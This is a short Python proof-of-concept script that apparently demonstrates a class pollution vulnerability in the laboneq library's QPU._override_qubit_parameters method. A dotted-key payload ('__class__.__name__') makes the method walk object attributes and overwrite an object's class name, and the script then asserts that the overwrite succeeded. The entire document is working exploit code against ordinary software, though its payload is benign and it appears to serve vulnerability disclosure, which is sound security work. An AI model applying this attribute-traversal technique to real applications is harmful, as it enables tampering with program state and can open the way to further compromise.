# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: _override_qubit_parameters
# Type: get-attr-set-attr

from laboneq.dsl.quantum.qpu import QPU

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = {"__class__.__name__": payload_value}

class MockQubit:
  def __init__(self):
    self.parameters = target

def run_poc():
  qpu = QPU.__new__(QPU)
  qpu._override_qubit_parameters(MockQubit(), PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
